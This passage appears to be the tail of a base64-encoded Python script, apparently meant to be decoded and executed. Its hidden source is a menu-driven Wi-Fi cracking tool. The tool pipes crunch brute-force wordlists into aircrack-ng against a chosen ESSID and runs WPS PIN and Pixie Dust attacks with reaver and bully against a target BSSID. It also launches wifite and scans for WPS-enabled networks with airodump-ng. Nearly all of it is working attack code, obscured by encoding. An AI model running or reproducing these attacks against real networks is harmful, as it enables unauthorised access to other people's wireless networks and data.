gICAgICAgICAgICAgICAgICAgICAoISMkJS89P3t9W10tKjo7KQooNSkgIExvd2VyY2FzZSArIHVwcGVyY2FzZSBjaGFycyAgICAgICAgICAgICAgICAgICAgIChhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaKQooNikgIExvd2VyY2FzZSArIG51bWVyaWMgY2hhcnMgICAgICAgICAgICAgICAgICAgICAgIChhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkpCig3KSAgVXBwZXJjYXNlICsgbnVtZXJpYyBjaGFycyAgICAgICAgICAgICAgICAgICAgICAgKEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OSkKKDgpICBTeW1ib2wgKyBudW1lcmljIGNoYXJzICAgICAgICAgICAgICAgICAgICAgICAgICAoISMkJS89P3t9W10tKjo7MDEyMzQ1Njc4OSkKKDkpICBMb3dlcmNhc2UgKyB1cHBlcmNhc2UgKyBudW1lcmljIGNoYXJzICAgICAgICAgICAoYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkpIAooMTApIExvd2VyY2FzZSArIHVwcGVyY2FzZSArIHN5bWJvbCBjaGFycyAgICAgICAgICAgIChhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaISMkJS89P3t9W10tKjo7KQooMTEpIExvd2VyY2FzZSArIHVwcGVyY2FzZSArIG51bWVyaWMgKyBzeW1ib2wgY2hhcnMgIChhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OSEjJCUvPT97fVtdLSo6OykKKDEyKSBZb3VyIE93biBXb3JkcyBhbmQgbnVtYmVycwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpDcmFjayBQYXNzd29yZCBDb3VsZCBUYWtlIEhvdXJzLERheXMsV2Vla3MsTW9udGhzIHRvIGNvbXBsZXRlCmFuZCB0aGUgc3BlZWQgb2YgY3JhY2tpbmcgd2lsbCByZWR1Y2UgYmVjYXVzZSB5b3UgZ2VuZXJhdGUgYSBIdWdlLEh1Z2UgUGFzc3dvcmRsaXN0Cm1heSByZWFjaCB0byBIdW5kcmVkcyBvZiBUZVJhIEJpdHMgc28gQmUgcGF0aWFudAoiIiIpCiAgICAgICAgcHJpbnQoIlxuRW50ZXIgeW91ciBjaG9pc2UgaGVyZSA6ID8iKQogICAgICAgIHNldCA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgaWYgc2V0ID09ICIxIjoKICAgICAgICAgICAgdGVzdCA9IHN0cigiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICIyIjoKICAgICAgICAgICAgdGVzdCA9IHN0cigiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICIzIjoKICAgICAgICAgICAgdGVzdCA9IHN0cigiMDEyMzQ1Njc4OSIpCiAgICAgICAgICAgIG9yZGVyID0gImNydW5jaCB7fSB7fSB7fSB8IGFpcmNyYWNrLW5nIHt9IC1lIHt9IC13LSIuZm9ybWF0KG1pbmksbWF4LHRlc3QscGF0aCxlc3NpZCkKICAgICAgICAgICAgZ2VueSAgPSBvcy5zeXN0ZW0ob3JkZXIpCiAgICAgICAgZWxpZiBzZXQgPT0gIjQiOgogICAgICAgICAgICB0ZXN0ID0gc3RyKCIhIyQlLz0/e31bXS0qOjsiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICI1IjoKICAgICAgICAgICAgdGVzdCA9IHN0cigiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWiIpCiAgICAgICAgICAgIG9yZGVyID0gImNydW5jaCB7fSB7fSB7fSB8IGFpcmNyYWNrLW5nIHt9IC1lIHt9IC13LSIuZm9ybWF0KG1pbmksbWF4LHRlc3QscGF0aCxlc3NpZCkKICAgICAgICAgICAgZ2VueSAgPSBvcy5zeXN0ZW0ob3JkZXIpCiAgICAgICAgZWxpZiBzZXQgPT0gIjYiOgogICAgICAgICAgICB0ZXN0ID0gc3RyKCJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICI3IjoKICAgICAgICAgICAgdGVzdCA9IHN0cigiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IikKICAgICAgICAgICAgb3JkZXIgPSAiY3J1bmNoIHt9IHt9IHt9IHwgYWlyY3JhY2stbmcge30gLWUge30gLXctIi5mb3JtYXQobWluaSxtYXgsdGVzdCxwYXRoLGVzc2lkKQogICAgICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBlbGlmIHNldCA9PSAiOCI6CiAgICAgICAgICAgIHRlc3QgPSBzdHIoIiEjJCUvPT97fVtdLSo6OzAxMjM0NTY3ODkiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICI5IjoKICAgICAgICAgICAgdGVzdCA9IHN0cigiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICIxMCI6CiAgICAgICAgICAgIHRlc3QgPSBzdHIoImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVohIyQlLz0/e31bXS0qOjsiKQogICAgICAgICAgICBvcmRlciA9ICJjcnVuY2gge30ge30ge30gfCBhaXJjcmFjay1uZyB7fSAtZSB7fSAtdy0iLmZvcm1hdChtaW5pLG1heCx0ZXN0LHBhdGgsZXNzaWQpCiAgICAgICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGVsaWYgc2V0ID09ICIxMSI6CiAgICAgICAgICAgIHRlc3QgPSBzdHIoImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5ISMkJS89P3t9W10tKjo7IikKICAgICAgICAgICAgb3JkZXIgPSAiY3J1bmNoIHt9IHt9IHt9IHwgYWlyY3JhY2stbmcge30gLWUge30gLXctIi5mb3JtYXQobWluaSxtYXgsdGVzdCxwYXRoLGVzc2lkKQogICAgICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBlbGlmIHNldCA9PSAiMTIiOgogICAgICAgICAgICBwcmludCgiRW50ZXIgeW91IE93biBXb3JkcyBhbmQgbnVtYmVycyIpCiAgICAgICAgICAgIHRlc3QgID0gc3RyKGlucHV0KCIiKSkKICAgICAgICAgICAgb3JkZXIgPSAiY3J1bmNoIHt9IHt9IHt9IHwgYWlyY3JhY2stbmcge30gLWUge30gLXctIi5mb3JtYXQobWluaSxtYXgsdGVzdCxwYXRoLGVzc2lkKQogICAgICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiXG5Ob3QgRm91bmQiKQogICAgICAgICAgICBpbnRybygpCiAgICAgICAgcHJpbnQoIkNvcHkgdGhlIFBhc3N3b3JkIGFuZCBDbG9zZSB0aGUgdG9vbCIpCiAgICAgICAgY21kNSA9IG9zLnN5c3RlbSgic2xlZXAgM2QiKQogICAgZWxpZiB2YXIgPT0gOSA6CiAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIG1pbmltdW0gbGVuZ3RoIG9mIHRoZSBwYXNzd29yZCAoOC82NCk/IikKICAgICAgICBtaW5pID0gaW50KGlucHV0KCIiKSkKICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgbWF4aW11bSBsZW5ndGggb2YgdGhlIHBhc3N3b3JkICg4LzY0KT8iKQogICAgICAgIG1heCAgPSBpbnQoaW5wdXQoIiIpKQogICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBwYXRoIG9mIHRoZSBvdXRwdXQgZmlsZT8iKQogICAgICAgIHBhdGggPSBzdHIoaW5wdXQoIiIpKQogICAgICAgIHByaW50KCJcbkVudGVyIHdoYXQgeW91IHdhbnQgdGhlIHBhc3N3b3JkIGNvbnRhaW4gPyIpCiAgICAgICAgcGFzc3dvcmQgPSBzdHIoaW5wdXQoIiIpKQogICAgICAgIG9yZGVyID0gKCJjcnVuY2gge30ge30ge30gLW8ge30iKS5mb3JtYXQobWluaSxtYXgscGFzc3dvcmQscGF0aCkKICAgICAgICBnZW55ID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGEgPSAoIlRoZSB3b3JkbGlzdCBpbiA+Pj4+PiB7fSBOYW1lZCBhcyBTUkFSVCIpLmZvcm1hdChwYXRoKQogICAgICAgIHByaW50KGEpCiAgICBlbGlmIHZhciA9PSAxMDoKICAgICAgICBjbWQgPSBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBwcmludCgiIiIKMSlSZWF2ZXIKMilCdWxseQozKXdpZml0ZSAoUmVjb21tZW5lZGVkKQo0KVBpeGllV3BzCgowKSBCYWNrIHRvIE1haW4gTWVudQoiIiIpCiAgICAgICAgcHJpbnQoIkNob29zZSB0aGUga2luZCBvZiB0aGUgYXR0YWNrKEV4dGVybmFsIFdJRkkgQWRhcHRlciBSZXF1aXJlKSA/IikKICAgICAgICBhdHRhY2sgPSBpbnQoaW5wdXQoIiIpKQogICAgICAgIGlmIGF0dGFjayA9PSAxOgogICAgICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgaW50ZXJmYWNlIHRvIHN0YXJ0ID8oRGVmYXVsdChXbGFuMG1vbi9XbGFuMW1vbikpIikKICAgICAgICAgICAgaW50ZXJmYWNlID0gc3RyKGlucHV0KCIiKSkKICAgICAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIGJzc2lkIG9mIHRoZSBuZXR3b3JrID8iKQogICAgICAgICAgICBic3NpZCA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgICAgIG9yZGVyID0gKCJyZWF2ZXIgLWkge30gLWIge30gLXZ2IikuZm9ybWF0KGludGVyZmFjZSxic3NpZCkKICAgICAgICAgICAgZ2VueSA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICAgICAgaW50cm8oKQogICAgICAgIGVsaWYgYXR0YWNrID09IDI6CiAgICAgICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBpbnRlcmZhY2UgdG8gc3RhcnQgPyhEZWZhdWx0KFdsYW4wbW9uL1dsYW4xbW9uKSIpCiAgICAgICAgICAgIGludGVyZmFjZSA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBic3NpZCBvZiB0aGUgbmV0d29yayA/IikKICAgICAgICAgICAgYnNzaWQgPSBzdHIoaW5wdXQoIiIpKQogICAgICAgICAgICBwcmludCgiXG5FbnRlciB0aGUgY2hhbm5lbCBvZiB0aGUgbmV0d29yayA/IikKICAgICAgICAgICAgY2hhbm5lbCA9IGludChpbnB1dCgiIikpCiAgICAgICAgICAgIG9yZGVyID0gKCJidWxseSAtYiB7fSAtYyB7fSAtLXBpeGlld3BzIHt9IikuZm9ybWF0KGJzc2lkLGNoYW5uZWwsaW50ZXJmYWNlKQogICAgICAgICAgICBnZW55ID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgICAgICBpbnRybygpCiAgICAgICAgZWxpZiBhdHRhY2sgPT0gMzoKICAgICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJ3aWZpdGUiKQogICAgICAgICAgICBpbnRybygpCiAgICAgICAgZWxpZiBhdHRhY2sgPT0gNDoKICAgICAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIGludGVyZmFjZSB0byBzdGFydCA/KERlZmF1bHQoV2xhbjBtb24vV2xhbjFtb24pIikKICAgICAgICAgICAgaW50ZXJmYWNlID0gc3RyKGlucHV0KCIiKSkKICAgICAgICAgICAgcHJpbnQoIlxuRW50ZXIgdGhlIGJzc2lkIG9mIHRoZSBuZXR3b3JrID8iKQogICAgICAgICAgICBic3NpZCA9IHN0cihpbnB1dCgiIikpCiAgICAgICAgICAgIG9yZGVyID0gKCJyZWF2ZXIgLWkge30gLWIge30gLUsiKS5mb3JtYXQoaW50ZXJmYWNlLGJzc2lkKQogICAgICAgICAgICBnZW55ID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgICAgICBpbnRybygpCiAgICAgICAgZWxpZiBhdHRhY2sgPT0gMCA6CiAgICAgICAgICAgIGludHJvKCkKICAgIGVsaWYgdmFyID09IDExOgogICAgICAgIHByaW50KCJcbkVudGVyIHRoZSBpbnRlcmZhY2UgdG8gc3RhcnQgPyhEZWZhdWx0KFdsYW4wbW9uL1dsYW4xbW9uKSIpCiAgICAgICAgaW50ZXJmYWNlID0gc3RyKGlucHV0KCIiKSkKICAgICAgICBvcmRlciA9ICJhaXJvZHVtcC1uZyAtTSAtLXdwcyB7fSIuZm9ybWF0KGludGVyZmFjZSkKICAgICAgICBnZW55ID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGNtZCA9IG9zLnN5c3RlbSgic2xlZXAgNSAiKQogICAgICAgIGludHJvKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIk5vdCBGb3VuZCIpCiAgICAgICAgY21kID0gb3Muc3lzdGVtKCJzbGVlcCAyIikKICAgICAgICBpbnRybygpCmludHJvKCk="))